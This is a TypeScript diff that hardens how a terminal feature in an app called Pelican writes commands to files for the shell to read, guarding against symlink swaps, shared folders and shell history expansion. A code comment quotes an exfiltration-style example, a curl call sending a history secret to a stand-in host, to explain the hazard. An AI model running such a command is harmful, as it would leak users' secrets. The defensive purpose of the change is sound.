@@ -1,7 +1,7 @@
 import { execFile } from 'node:child_process';
 import { randomUUID } from 'node:crypto';
 import { accessSync, rmSync } from 'node:fs';
-import { access, constants, mkdtemp, rm, writeFile } from 'node:fs/promises';
+import { access, constants, type FileHandle, lstat, mkdir, mkdtemp, open, readdir, rm, stat } from 'node:fs/promises';
 import os from 'node:os';
 import path from 'node:path';
 
@@ -764,7 +764,7 @@ class Term {
   }
 
   /** Run in terminal's command, in its file of its own (commandFile), taken away as the terminal closes. */
-  runFile?: string;
+  runFiles: string[] = [];
 
   /**
    * Run in terminal: types `line`, and Enter, once the shell is ready for it, its first output
@@ -818,7 +818,11 @@ class Term {
     // printed keeps nobody busy once its terminal is closed.
     dropPendingOutput(this.screen);
     this.screen.dispose();
-    if (this.runFile) void rm(this.runFile, { force: true }).catch(() => undefined);
+    // As Pelican stops, at once: it may not be there to finish later.
+    for (const made of this.runFiles) {
+      if (stopping) rmSync(made, { recursive: true, force: true });
+      else void rm(made, { recursive: true, force: true }).catch(() => undefined);
+    }
     if (this.paused) this.pty.resume();
     if (this.exit) return;
     try {
@@ -906,35 +910,113 @@ export function listTerminals(cwd?: string): TerminalInfo[] {
  * typed there is one bash, zsh, csh and tcsh expand a `!` in, from the history, before it runs,
  * also inside double quotes: `echo "!?SECRET?"` printed a secret from the history file, and a
  * `curl "https://x.example/?d=!?SECRET?"` would have sent it off, though the block read as it runs
- * once Claude's own tools ran it. A file read in is not expanded so: the command runs as it reads,
+ * once Claude's own tools ran it. A file read in is not expanded so by bash and zsh, and csh and
+ * tcsh are told to expand nothing while they read it (aroundCommand): the command runs as it reads,
  * in the shell, its folder and its variables, as if typed. A shell that reads no such file (an
  * unusual one, with no history to expand from `!`) gets the command typed, as before.
+ *
+ * The folder is `run` in Pelican's state folder, made again whenever it has gone, and checked each
+ * time before a file goes in it (ownFolder). One in /tmp, made once per process, was taken away by
+ * macOS's nightly cleaner once it had been empty for 3 days, after which Run in terminal failed
+ * until Pelican started again, and a folder of that name someone else made was written into. A
+ * history that kept the line that read a file names one in a folder nobody else can write to, and
+ * each file's name is one nobody can guess.
  */
-let runFolder: Promise<string> | undefined;
-let runFolderMade: string | undefined;
-let runCount = 0;
+
+/** Run in terminal's command could not be written for its shell to read; its message says why (app.ts answers 503 with it). */
+export class CommandNotWritten extends Error {}
 
 /** A path the shells read as it is, quoted in none of them. */
 const PLAIN_PATH = /^[\w./-]+$/;
 
-/** The folder for the commands' files: in /tmp (a short path to read at the prompt), or else the system's temporary folder. */
-function runFolderNow(): Promise<string> {
-  if (runFolder) return runFolder;
-  const made = (async () => {
-    for (const base of ['/tmp', os.tmpdir()]) {
-      // mkdtemp makes it readable by this account alone (0700), under a name nobody else picks.
-      const dir = await mkdtemp(path.join(base, 'pelican-run-')).catch(() => undefined);
-      if (dir && PLAIN_PATH.test(dir)) return (runFolderMade = dir);
-      if (dir) await rm(dir, { recursive: true, force: true });
+/** A command's file left behind, Pelican having been stopped before it could take it away, goes once this old. */
+const LEFT_BEHIND_MS = 24 * 3600_000;
+
+/** This account, as a file's owner: none where the system has no such thing (Windows). */
+const account = (): number | undefined => process.getuid?.();
+
+/** Why no command was written in `dir`, as what is there (lstat follows no link) or `error` says. */
+async function notWritten(dir: string, error: unknown): Promise<CommandNotWritten> {
+  if (error instanceof CommandNotWritten) return error;
+  const there = await lstat(dir).catch(() => undefined);
+  if (there?.isSymbolicLink()) return new CommandNotWritten(`${dir} is a link, so Run in terminal writes no command there. Remove it, and Pelican makes the folder again.`);
+  if (there && !there.isDirectory()) return new CommandNotWritten(`${dir} is not a folder, so Run in terminal writes no command there. Remove it, and Pelican makes the folder again.`);
+  return new CommandNotWritten(`Run in terminal could not write the command in ${dir}: ${error instanceof Error ? error.message : String(error)}`);
+}
+
+/**
+ * Checks, before a command goes in `dir`, that it is a folder of this account's alone: opened
+ * without following a link, a folder, this account's, and open to nobody else; one of its own that
+ * others could read or write in is made 0700 again.
+ */
+async function ownFolder(dir: string): Promise<void> {
+  let handle: FileHandle | undefined;
+  try {
+    handle = await open(dir, constants.O_RDONLY | constants.O_DIRECTORY | constants.O_NOFOLLOW);
+    const info = await handle.stat();
+    const me = account();
+    if (me !== undefined && info.uid !== me) throw new CommandNotWritten(`${dir} belongs to another account, so Run in terminal writes no command there.`);
+    if ((info.mode & 0o077) !== 0) await handle.chmod(0o700);
+  } catch (error) {
+    throw await notWritten(dir, error);
+  } finally {
+    await handle?.close();
+  }
+}
+
+/** Whether no other account can rename or remove what is in `dir` (it is open to none, or sticky, as /tmp is): none can swap `run` there for a folder of its own. */
+async function keptFromOthers(dir: string): Promise<boolean> {
+  const { mode } = await stat(dir);
+  return (mode & 0o022) === 0 || (mode & 0o1000) !== 0;
+}
+
+/** Files of `run` left behind (Pelican was stopped before their terminals closed), once LEFT_BEHIND_MS old, are taken away. */
+async function sweepLeftBehind(dir: string): Promise<void> {
+  const now = Date.now();
+  for (const name of await readdir(dir).catch((): string[] => [])) {
+    const file = path.join(dir, name);
+    const info = await lstat(file).catch(() => undefined);
+    if (info?.isFile() && now - info.mtimeMs > LEFT_BEHIND_MS) await rm(file, { force: true }).catch(() => undefined);
+  }
+}
+
+/**
+ * The folder a command's file goes in, checked (ownFolder): `run` in Pelican's state folder, made
+ * again if it has gone; or, where its path is not one the shells read as it is (a space in it) or
+ * others could swap it, a folder made for this command alone in the system's temporary folder
+ * (`own`), which goes with its terminal.
+ */
+async function commandFolder(): Promise<{ dir: string; own: boolean }> {
+  const state = path.resolve(config.stateDir);
+  const dir = path.join(state, 'run');
+  if (PLAIN_PATH.test(dir)) {
+    try {
+      await mkdir(state, { recursive: true, mode: 0o700 });
+      if (await keptFromOthers(state)) {
+        await mkdir(dir, { mode: 0o700 }).catch((error: NodeJS.ErrnoException) => {
+          if (error.code !== 'EEXIST') throw error;
+        });
+        await ownFolder(dir);
+        await sweepLeftBehind(dir);
+        return { dir, own: false };
+      }
+    } catch (error) {
+      throw await notWritten(dir, error);
     }
-    throw new Error('Pelican found no folder of its own to run the command from.');
-  })();
-  // A folder that could not be made is tried again next time.
-  made.catch(() => {
-    if (runFolder === made) runFolder = undefined;
-  });
-  runFolder = made;
-  return made;
+  }
+  for (const base of [os.tmpdir(), '/tmp']) {
+    // mkdtemp makes it readable by this account alone (0700), under a name nobody else picks.
+    const made = await mkdtemp(path.join(base, 'pelican-run-')).catch(() => undefined);
+    if (made && PLAIN_PATH.test(made)) {
+      await ownFolder(made).catch(async (error: unknown) => {
+        await rm(made, { recursive: true, force: true }).catch(() => undefined);
+        throw error;
+      });
+      return { dir: made, own: true };
+    }
+    if (made) await rm(made, { recursive: true, force: true });
+  }
+  throw new CommandNotWritten('Run in terminal found no folder of this account’s alone to write the command in.');
 }
 
 /** How a shell, by the name a tab gives it, reads a file of commands into itself: `.` in sh's family, `source` in fish's and csh's. */
@@ -944,10 +1026,11 @@ function readsFile(shell: string): '.' | 'source' | undefined {
   return undefined;
 }
 
-/** `text` in a POSIX shell's single quotes, where nothing is read: each quote in it ends them, is escaped, and starts them again. */
-const posixQuoted = (text: string) => `'${text.replaceAll("'", "'\\''")}'`;
-/** `text` in fish's single quotes, where only `\'` and `\\` are read. */
-const fishQuoted = (text: string) => `'${text.replace(/[\\']/g, (c) => `\\${c}`)}'`;
+/** `text` in single quotes as sh, bash and zsh read them: nothing in it expanded. */
+const shQuoted = (text: string) => `'${text.replaceAll('\'', '\'\\\'\'')}'`;
+
+/** `text` in single quotes as fish reads them, where a backslash escapes a quote or a backslash. */
+const fishQuoted = (text: string) => `'${text.replace(/[\\']/g, '\\$&')}'`;
 
 /**
  * What the file runs before the command: the command, printed dimmed, as a terminal shows what was
@@ -958,24 +1041,74 @@ const fishQuoted = (text: string) => `'${text.replace(/[\\']/g, (c) => `\\${c}`)
  */
 export function shownFirst(command: string, shell: string): string {
   const printed = (quoted: string) => `command printf '\\033[2m%s\\033[0m\\n' ${quoted}\n`;
-  if (/^(sh|bash|rbash|zsh|dash|ash|ksh|ksh93|mksh|lksh|oksh|pdksh|yash|posh|osh)$/i.test(shell)) return printed(posixQuoted(command));
+  if (/^(sh|bash|rbash|zsh|dash|ash|ksh|ksh93|mksh|lksh|oksh|pdksh|yash|posh|osh)$/i.test(shell)) return printed(shQuoted(command));
   if (shell === 'fish') return printed(fishQuoted(command));
   return '';
 }
 
+/** csh and tcsh: histchars kept, then emptied, so that they take no `!` from the history in what they read next… */
+const CSH_OFF = 'set _pelican_off\nif ($?histchars) then\nset _pelican_histchars = $histchars:q\nendif\nset histchars = ""\n';
+/** …and put back as it was. */
+const CSH_BACK = 'if ($?_pelican_off) then\nif ($?_pelican_histchars) then\nset histchars = $_pelican_histchars:q\nunset _pelican_histchars\nelse\nunset histchars\nendif\nunset _pelican_off\nendif\n';
+
 /**
- * Writes `command` for Run in terminal into a file of its own (readable by this account alone),
- * after what prints it first (shownFirst), and says the line that has `shell` read it in; undefined
- * for a shell that reads no such file.
+ * What a shell's file has it do before the command, and for csh and tcsh a second file, read after
+ * the first on the line typed, which tcsh goes on to also when the command stopped on an error or
+ * Ctrl+C:
+ * - bash, zsh and fish (4 and later) put the command itself in the shell's history, quoted so that
+ *   nothing in it is expanded, for Up and Enter to run it again rather than the line that read the
+ *   file. bash takes that line out as it does (`history -s`); fish, and zsh with HIST_IGNORE_SPACE,
+ *   leave it out, typed with a space before it (typedLine).
+ * - csh and tcsh take a `!` from the history in a file they read too: histchars, kept, is emptied
+ *   while they read the command, so they take none, and put back as it was after.
  */
-export async function commandFile(command: string, shell: string): Promise<{ file: string; line: string } | undefined> {
+function aroundCommand(command: string, shell: string): { before: string; after?: string } {
+  if (shell === 'bash') return { before: `if [[ -o history ]]; then builtin history -s -- ${shQuoted(command)}; fi\n` };
+  if (shell === 'zsh') return { before: `builtin print -rs -- ${shQuoted(command)}\n` };
+  // fish 3 has no `history append`, and would search its history for these words instead.
+  if (shell === 'fish') return { before: command.startsWith('-') ? '' : `if string match -qr '^([4-9]|[1-9][0-9])' $FISH_VERSION\n    builtin history append ${fishQuoted(command)}\nend\n` };
+  if (shell === 'csh' || shell === 'tcsh') return { before: CSH_OFF, after: CSH_BACK };
+  return { before: '' };
+}
+
+/** The line typed for `shell` to read `file`, and `after` (csh's) once it has. */
+function typedLine(shell: string, reads: '.' | 'source', file: string, after?: string): string {
+  if (after) return `${reads} ${file}; ${reads} ${after}`;
+  return `${/^(bash|zsh|fish)$/.test(shell) ? ' ' : ''}${reads} ${file}`;
+}
+
+/** Writes a new file, readable by this account alone: none that is there already, or a link, is written through. */
+async function writeNew(file: string, text: string): Promise<void> {
+  const handle = await open(file, constants.O_WRONLY | constants.O_CREAT | constants.O_EXCL | constants.O_NOFOLLOW, 0o600);
+  try {
+    await handle.writeFile(text);
+  } finally {
+    await handle.close();
+  }
+}
+
+/**
+ * Writes `command` for Run in terminal into a file of its own (readable by this account alone,
+ * commandFolder) and says the line that has `shell` read it in, and what to take away with its
+ * terminal; undefined for a shell that reads no such file. CommandNotWritten says why it could not.
+ */
+export async function commandFile(command: string, shell: string): Promise<{ file: string; line: string; remove: string[] } | undefined> {
   const reads = readsFile(shell);
   if (!reads) return undefined;
-  runCount += 1;
+  const { dir, own } = await commandFolder();
   // PowerShell reads in only a file whose name ends .ps1.
-  const file = path.join(await runFolderNow(), `${runCount}${/^(pwsh|powershell)$/i.test(shell) ? '.ps1' : ''}`);
-  await writeFile(file, `${shownFirst(command, shell)}${command}\n`, { mode: 0o600, flag: 'wx' });
-  return { file, line: `${reads} ${file}` };
+  const file = path.join(dir, `${randomUUID()}${/^(pwsh|powershell)$/i.test(shell) ? '.ps1' : ''}`);
+  const { before, after } = aroundCommand(command, shell);
+  const then = after === undefined ? undefined : `${file}.after`;
+  const remove = own ? [dir] : [file, ...(then ? [then] : [])];
+  try {
+    await writeNew(file, `${before}${shownFirst(command, shell)}${command}\n`);
+    if (then) await writeNew(then, after!);
+  } catch (error) {
+    for (const made of remove) await rm(made, { recursive: true, force: true }).catch(() => undefined);
+    throw await notWritten(dir, error);
+  }
+  return { file, line: typedLine(shell, reads, file, then), remove };
 }
 
 /**
@@ -1001,7 +1134,7 @@ export async function openTerminal(cwd: string, size: { cols: number; rows: numb
   const term = new Term(cwd, pty, file, size.cols, size.rows, options.colors);
   terminals.set(term.id, term);
   if (run) {
-    term.runFile = run.file;
+    term.runFiles = run.remove;
     term.typeWhenReady(run.line);
   } else if (options.command) {
     term.typeWhenReady(options.command, true);
@@ -1080,9 +1213,6 @@ export function closeTerminal(id: string): boolean {
 /** Every terminal ends with Pelican, and Run in terminal's files with them. */
 export function closeAllTerminals(): void {
   for (const term of [...terminals.values()]) term.close(true);
-  if (runFolderMade) rmSync(runFolderMade, { recursive: true, force: true });
-  runFolder = undefined;
-  runFolderMade = undefined;
   clearInterval(sweeping);
   sweeping = undefined;
   clearInterval(checkingSignIns);
